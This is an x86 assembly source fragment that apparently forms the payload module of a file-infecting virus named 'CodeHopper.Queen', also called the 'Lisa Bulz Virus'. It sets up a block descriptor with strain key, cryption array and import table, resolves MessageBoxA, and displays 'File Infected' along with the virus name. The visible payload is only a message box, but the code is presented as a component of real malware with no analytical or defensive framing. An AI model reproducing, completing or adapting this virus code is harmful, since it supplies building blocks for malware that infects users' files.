


;On Entry ebp Points To BlockDescriptor
Payload_BlockDescryptor:
Payload_StrainKey        DD 0
Payload_BlockSize        DD Payload_BlockTerminator - Payload_BlockDescryptor
Payload_CryptionArray_   DD Payload_CryptionArray-Payload_BlockDescryptor
Payload_Cryptions        DD 1
Payload_ImportArray_     DD Payload_ImportArray-Payload_BlockDescryptor
Payload_EntryPoint:

mov  eax,[ebp+(Payload_ImportArray-Payload_BlockDescryptor)+8]
push DWORD 0 ;MesageBox Style
lea  edx,[ebp+(Payload_TitleString-Payload_BlockDescryptor)]
push edx     ;MessageBox Title
lea  edx,[ebp+(Payload_ContentString-Payload_BlockDescryptor)]
push edx     ;MessageBox Text
push DWORD 0 ;Handle Of Owner Window (none)
call eax     ;Call MessageBoxA

RET

Payload_CryptionArray:
DD    0
DD    0

Payload_MessageBoxA DB "MessageBoxA",0
Payload_ImportArray:
DD 1                                            ;Number Of Imports
DD Payload_MessageBoxA-Payload_BlockDescryptor  ;Address Of Name
DD 0                                            ;Address Of Function

Payload_TitleString   DB "CodeHopper.Queen",0
Payload_ContentString DB "File Infected",0xA,"CodeHopper Virus",0xA,"(AKA Lisa Bulz Virus)",0

Payload_BlockTerminator:
